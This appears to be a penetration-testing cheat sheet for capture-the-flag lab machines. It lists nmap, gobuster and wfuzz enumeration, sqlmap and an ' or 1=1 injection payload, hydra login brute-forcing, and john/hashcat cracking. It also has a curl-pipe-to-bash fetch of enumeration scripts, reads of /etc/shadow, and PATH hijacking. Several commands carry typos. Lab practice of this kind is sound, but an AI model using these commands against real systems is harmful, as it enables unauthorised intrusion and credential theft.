# Enumeration Phase

#### Nmap Enumeration

- I used the machine name as wr3nch and ist ip as 10.10.10.10 just for example


```bash
# normal nmap scan enumerates only open ports
nmap -Pn -vv -sC -sV -oN wr3nch.nmap 10.10.10.10
# nmap full ports scan TCP
nmap -p- -vv -sC -sV -oN wr3nch.nmap 10.10.10.10
# nmap UDP scan
nmap -sU -p- -oN wr3nch.nmap 10.10.10.10
# namp query shown by htb for port enumeratuion
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.10 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV -oN wr3nch.nmap 10.10.10.10
```

#### Directory Enumeration


- wordlist = `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

###### Gobuster

```bash
# directory listing mode
gobuster dir -u http://10.10.10.10 -w wordlist  -x php,html,txt,xml -o gobuster-out.txt
# enumerates virtual hosts
gobuster vhost -u http://10.10.10.10 -w wordlist -o vhost.txt
# if proxy needed
add `-p <proxy address>` in the dir mode and vhost mode
```


###### Wfuzz

```bash
# directory enumeration
wfuzz -u http://10.10.10.10/FUZZ -c -v -u http://10.10.10.10 -w wordlist --hc 404
# vhost enumeration
wfuzz -H 'HEAD: FUZZ.htb' -w wordlist -u http://10.10.10.10 --hw 0
# make a login attack (post request)
wfuzz -c -v -z file,wordlist -z file,wordlist -d "username=FUZZ&password=FUZ2Z" --hs incorrect --hs invalid http://10.10.10.10/login.php
# if proxy needed
add `-p <proxy address>` in the dir mode and vhost mode
```

#### Sql Injection

```bash
# capture the login request with burp and save it as login.req
sqlmap -r login.req --level=5 --risk=3 --batch
# manual expoitation
> Capture the request with burp
> The entered paramaters will be url encoded, decode it with <ctrl>+<shift>+<u>
> Enter the payload " ' or 1 = 1 -- - " (simple sql injection payload)
> After changing the payload, url encode it with <ctrl>+<u>
```

#### Curl and Wget

- Utilities present for making request and obtaining files

```bash
# make http, http2, http3 requests with curl
curl -vv http://10.10.10.10
curl --http2 http://10.10.10.10
curl --http3 http://10.10.10.10
# obtain only the response header
curl --head http://10.10.10.10.
# upload files via curl
curl --user "{user}:{creds}" --upload-file=<file> "http://10.10.10.10/upload_location"
# curl save the output
curl http://10.10.10.10 -o index.html
# pipe the requesting files
curl http://10.10.10.10:<port_no>:lin(peas\|enum).sh | bash
```

```bash
# download files with wget
wget http://10.10.10.10/xxx.sh
# run files without downloading
wget -O - http://10.10.10.11:<port_no>:lin(peas\|enum).sh
```

# BruteForcing Things

#### Login BruteForce

- Hydra, login page is found at `http://10.10.10.10/login.php`

```bash
# syntax
# hydra -L userslist -P passwordslist <url> http-post-form login_page:request_body:error_message
hydra -L usernames.txt -P passwords.txt 10.10.10.10 http-post-form "/login.php:username:^USER^&password=^PASS^&Login=Login:Login Failed"
# login_page = /login.php
# request_body = username:^USER^&password=^PASS^&Login=Login
# error_message = Login Failed
```

#### Cracking files/hashes

##### Zip files with john

```bash
zip2john \<zipfile\> \> zipfile.hash
john  --format=zip zipfile.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

##### Cracking Hashes 

```bash
john \<hashes_file \> --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m \<Cracking mode\> \<hashes_file\> /usr/share/wordlists/rockyou.txt
```

# Post Exploitation

#### Find Files that contains specific sting in it

```bash
grep -iRl "I am a search string" ./
find . -type f -print0 | xargs -0 -e grep -niH -e "your common word to search"
```

#### File Transfer

> LINK AREA

#### Post Exploitation Commands:

| Description | Unix | CMD | Powershell |
| -- | -- | -- | -- |
| User Logged in | whoami | echo %username% | $env:username|
| | | | [System.Security.Principal.WindowsIdentity]::GetCurrent().Name |
| Change Directory | cd \<path\> | cd \<path\> | Set-Location \<path\> |
| Lis the directory | ls | dir | Get-ChildItem |
| View file contents | cat \<file\> | type \<file\> | Get-Content \<file\> |
| Move files | mv \<file.org\> \<file.mov\> | move \<file.org\> \<file.mov\> | Move-Item \<file.org\> \<file.mov\> |
| Clear Screen | clear | cls | Clear-Host |
| Copy files | cp \<file.org\> \<file.cpy\> | copy \<file.org\> \<file.cpy\> | Copy-Item \<file.org\> \<file.cpy\> | 
| Delete files | rm \<file\> | del \<file\> | Remove-Item \<file\>|
| Web Requests | curl \<url\> | | Invoke-WebRequest \<url\> |
| Supress Error messages | cd /Windows32/System 2>/dev/null | cat /etc/shadow 2>nul | Get-Content /etc/passwd -ErrorAction SilentlyContinue |

#### Network monitoring:

```bash
# network modules info and IPs
ifconfig
ipaddr
# shows the tcp connection
netstat -antp     
ss -antp  
#netstat -ano ; 0.0.0.0:445 = implies, SMB service is running within the machine and not open for others
#so it is best to perform port forwading and checking those services locally
# windows
netstat -antp 
ipconfig        
```

# Misc

#### Shell tty arrangements

```bash
# tty settings in local machine 
stty -a 
# change rows and columns in reverse shell
ssty columns 136 rows 32
```

#### Export path for path hijacking

```bash
export PATH=/tmp:$PATH
```